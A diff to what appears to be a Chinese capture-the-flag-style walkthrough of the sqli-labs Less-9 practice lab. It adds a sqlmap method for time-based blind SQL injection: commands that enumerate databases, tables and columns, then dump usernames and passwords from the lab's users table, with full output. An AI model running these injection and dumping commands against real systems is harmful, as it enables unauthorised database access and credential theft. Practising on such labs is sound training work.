@@ -5,6 +5,8 @@ url:http://10.0.2.15/sqli/Less-9/?id=1'
 url:http://10.0.2.15/sqli/Less-9/?id=1"
 显示：You are in...........
 即无论返回是对还是错，回显都是一样的文本，此时基于布尔盲注的方法已经不适用，故采用基于时间的盲注
+
+方法一（自己编写脚本进行基于时间的盲注）：
 首先运行脚本，爆出表名为
 users
 uagents
@@ -47,3 +49,58 @@ admin3
 dumbo
 admin4
 root@ka
+
+方法二（使用sqlmap）：
+sqlmap -u "http://localhost/sqli/Less-9/?id=1" --technique T --dbs
+爆出数据库名
+available databases [5]:
+[*] challenges
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] security
+爆出表名
+sqlmap -u "http://localhost/sqli/Less-9/?id=1" --technique T -D security --tables --batch
+Database: security
+[4 tables]
++----------+
+| emails   |
+| referers |
+| uagents  |
+| users    |
++----------+
+sqlmap -u "http://localhost/sqli/Less-9/?id=1" --technique T -D security -T users --columns --batch
+爆出字段名
+Database: security
+Table: users
+[3 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| id       | int(3)      |
+| password | varchar(20) |
+| username | varchar(20) |
++----------+-------------+
+sqlmap -u "http://localhost/sqli/Less-9/?id=1" --technique T -D security -T users -C username,password --dump --batch
+爆出字段值
+Database: security
+Table: users
+[13 entries]
++----------+------------+
+| username | password   |
++----------+------------+
+| admin    | admin      |
+| admin1   | admin1     |
+| admin2   | admin2     |
+| admin3   | admin3     |
+| admin4   | admin4     |
+| secure   | crappy     |
+| Dumb     | Dumb       |
+| dhakkan  | dumbo      |
+| superman | genious    |
+| Angelina | I-kill-you |
+| batman   | mob!le     |
+| Dummy    | p@ssword   |
+| stupid   | stupidity  |
++----------+------------+
+
